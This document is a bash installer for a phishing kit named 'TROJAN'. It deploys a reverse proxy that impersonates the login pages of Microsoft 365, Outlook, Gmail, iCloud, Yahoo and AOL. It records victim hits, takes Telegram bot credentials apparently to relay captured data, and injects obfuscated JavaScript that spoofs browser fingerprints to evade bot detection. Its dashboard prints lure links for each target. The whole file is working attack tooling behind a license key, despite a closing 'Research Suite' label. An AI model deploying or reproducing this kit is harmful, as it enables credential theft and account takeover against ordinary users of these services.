#!/bin/bash
# 🏛️ TROJAN - MASTER DEPLOYMENT (V15.0)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
}

# --- 1. PORT 80 INTELLIGENT MONITOR ---
show_header
echo -e "${CYAN}[...] Scanning Network Ports...${NC}"
CHECK_80=$(sudo lsof -t -i:80)
if [ ! -z "$CHECK_80" ]; then
    echo -e "${YELLOW}[!] Port 80 is currently occupied by PID: $CHECK_80${NC}"
    echo -e "${PURPLE}Note: Trojan needs Port 80 for SSL Handshakes & Clean Redirection.${NC}"
    read -p "Would you like to kill the conflicting process now? (y/n): " KILL_CONFIRM
    if [[ "$KILL_CONFIRM" == "y" ]]; then
        sudo kill -9 $CHECK_80
        echo -e "${GREEN}[success] Port 80 Released.${NC}"
    else
        echo -e "${RED}[error] Cannot proceed while Port 80 is locked. Exiting.${NC}"
        exit 1
    fi
fi

# --- 2. SYSTEM PRE-FLIGHT (NODE FIX INCLUDED) ---
DEPS=(curl dig php screen jq nodejs npm)
for dep in "${DEPS[@]}"; do
    if ! command -v $dep &> /dev/null; then
        sudo apt-get update -y && sudo apt-get install -y curl dnsutils php-cli screen jq nodejs npm
    fi
done

# --- 3. THE SECURITY GATE ---
MASTER_KEY="TROJAN-PRO-2026"
read -p "ENTER MASTER LICENSE KEY: " USER_KEY
[[ $(echo "$USER_KEY" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[!] ACCESS DENIED${NC}"; exit 1; }

# --- 4. VALIDATIONS ---
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    [[ $(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe") == *"\"ok\":true"* ]] && break || echo -e "${RED}Invalid Bot Token.${NC}"
done
read -p "Enter Telegram Chat ID: " TG_ID

while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    [[ $(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer $CF_TOKEN") == *"\"status\":\"active\""* ]] && break || echo -e "${RED}CF Token Rejected.${NC}"
done

VPS_IP=$(curl -s https://api.ipify.org)
while true; do
    read -p "Enter Base Domain: " USER_DOMAIN
    DNS_RESOLVE=$(dig +short "*.$USER_DOMAIN" | tail -n1)
    [[ "$DNS_RESOLVE" == "$VPS_IP" ]] && break || echo -e "${RED}DNS Mismatch! Points to [$DNS_RESOLVE].${NC}"
done

read -p "Enter Path Slug: /" USER_SLUG

# --- 5. POLYMORPHIC AKAMAI TELEMETRY ---
cat << 'EOF' > /tmp/raw_telemetry.js
(function() {
    setTimeout(function() {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        const getP = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(p) {
            if (p === 37445) return 'Intel Inc.';
            if (p === 37446) return 'Intel(R) Iris(TM) Graphics 6100';
            return getP.apply(this, arguments);
        };
        console.log("Trojan Telemetry Active.");
    }, 2000);
})();
EOF
# Ensure modern Node.js is used for this
javascript-obfuscator /tmp/raw_telemetry.js --output /var/www/adobe_gui/js/akamai_fingerprint.js --compact true --self-defending true --string-array true --string-array-encoding 'base64'
rm /tmp/raw_telemetry.js

# --- 6. TROJAN CONFIG DEPLOYMENT ---
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "listeningPortHTTP": 80,
  "target": "login.microsoftonline.com",
  "log": "/root/hits.json",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "cfToken": "$CF_TOKEN",
  "injectJs": "/var/www/adobe_gui/js/akamai_fingerprint.js",
  "slug": "$USER_SLUG",
  "headerRules": [ { "name": "X-Trojan-Edge", "value": "true" } ],
  "proxyRules": [
    {"hostname": "$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "*.office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "*.outlook.$USER_DOMAIN", "target": "outlook.live.com", "type": "proxy"},
    {"hostname": "*.gmail.$USER_DOMAIN", "target": "accounts.google.com", "type": "proxy"},
    {"hostname": "*.icloud.$USER_DOMAIN", "target": "www.icloud.com", "type": "proxy"},
    {"hostname": "*.yahoo.$USER_DOMAIN", "target": "login.yahoo.com", "type": "proxy"},
    {"hostname": "*.aol.$USER_DOMAIN", "target": "login.aol.com", "type": "proxy"}
  ]
}
EOF

# --- 7. THE TROJAN DASHBOARD (RUN.SH) ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
# (Colors and Header)
# ...
CONFIG="/root/config.json"
DOMAIN=$(jq -r '.proxyDomain' $CONFIG)
SLUG=$(jq -r '.slug' $CONFIG)
MASK=$(tr -dc '0-9' < /dev/urandom | head -c 10)
TOKEN=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 8)

clear
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${NC}  ${CYAN}TROJAN GHOST TERMINAL${NC}   | ${PURPLE}TARGETS:${NC} 06 | ${GREEN}STATUS: ONLINE${NC}      ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC} 01 | Office365 | https://$DOMAIN/s/?id=office&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 02 | Outlook   | https://$DOMAIN/s/?id=outlook&m=$MASK&s=$SLUG&t=$TOKEN ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 03 | Gmail     | https://$DOMAIN/s/?id=gmail&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 04 | iCloud    | https://$DOMAIN/s/?id=icloud&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 05 | Yahoo     | https://$DOMAIN/s/?id=yahoo&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 06 | AOL       | https://$DOMAIN/s/?id=aol&m=$MASK&s=$SLUG&t=$TOKEN     ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC}               ${YELLOW}LIVE ACTIVITY MONITOR (RECENT HITS)${NC}                ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
if [ -s /root/hits.json ]; then
    tail -n 5 /root/hits.json | jq -r '"║ \(.timestamp) | \(.target | ascii_upcase | .[0:8]) | \(.ip | .[0:15]) | \(.country | .[0:12]) ║"' 2>/dev/null
else
    echo -e "${BLUE}║${NC}        No activity detected yet. Waiting for Trojan...        ${BLUE}║${NC}"
fi
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════╝${NC}"

sudo fuser -k 80/tcp 443/tcp 2>/dev/null
pkill -9 php
pkill -9 proxy
cd /root/engine/dist/ && ./proxy -config /root/config.json
EOF

chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run
echo -e "${GREEN}[success] Trojan Research Suite Ready. Type 'Run'.${NC}"
